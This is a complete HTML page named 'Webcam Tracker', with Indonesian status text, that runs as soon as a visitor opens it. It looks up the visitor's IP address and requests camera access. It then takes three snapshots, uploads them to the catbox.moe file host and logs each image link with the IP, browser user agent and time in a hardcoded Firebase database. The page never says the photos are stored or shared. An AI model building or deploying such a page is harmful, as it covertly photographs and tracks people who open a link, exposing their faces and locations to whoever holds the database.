<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Webcam Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    #status { margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px; }
  </style>
</head>
<body>
  <h1>Webcam Tracker</h1>
  <div id="status">Memulai...</div>

  <script>
    // üîß Config Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // üéØ Elements
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const statusEl = document.getElementById('status');
    document.body.append(video, canvas);

    // üõ†Ô∏è Settings
    let photoCount = 0;
    const maxPhotos = 3; // Diubah jadi 3 foto untuk testing
    let visitorIP = "unknown";

    // üì§ Upload Functions
    async function uploadToCatbox(blob) {
      const formData = new FormData();
      formData.append('fileToUpload', blob, `webcam_${Date.now()}.jpg`);
      
      try {
        const res = await fetch('https://catbox.moe/user/api.php', {
          method: 'POST',
          body: formData
        });
        const url = await res.text();
        if (!url.startsWith('http')) throw new Error('Invalid response');
        return url;
      } catch (err) {
        throw new Error(`Catbox error: ${err.message}`);
      }
    }

    // üåê Get IP with fallback
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json', { 
          signal: AbortSignal.timeout(3000) 
        });
        const data = await res.json();
        return data.ip;
      } catch {
        return "unknown";
      }
    }

    // üì∑ Camera Handler
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
          statusEl.textContent = "Kamera siap!";
          capturePhotos();
        };
      } catch (err) {
        statusEl.textContent = `Error kamera: ${err.message}`;
      }
    }

    // üñºÔ∏è Main Capture Logic
    async function capturePhotos() {
      while (photoCount < maxPhotos) {
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        
        try {
          statusEl.textContent = `Mengupload foto ${photoCount + 1}...`;
          const blob = await new Promise(resolve => 
            canvas.toBlob(resolve, 'image/jpeg', 0.7)
          );
          
          const imageUrl = await uploadToCatbox(blob);
          await db.ref('webcam_snapshots').push({
            url: imageUrl,
            ip: visitorIP,
            userAgent: navigator.userAgent,
            time: new Date().toLocaleString('id-ID'),
            timestamp: Date.now()
          });
          
          photoCount++;
          statusEl.textContent = `Berhasil upload: ${photoCount}/${maxPhotos}`;
        } catch (err) {
          statusEl.textContent = `Upload gagal: ${err.message}`;
        }
      }
      
      statusEl.textContent = "Selesai!";
      video.srcObject?.getTracks().forEach(track => track.stop());
    }

    // üöÄ Init Process
    (async () => {
      statusEl.textContent = "Mendeteksi IP...";
      visitorIP = await getIP();
      statusEl.textContent = visitorIP === "unknown" 
        ? "Gagal deteksi IP, lanjut tanpa IP" 
        : `IP terdeteksi: ${visitorIP}`;
      startCamera();
    })();
  </script>
</body>
</html>
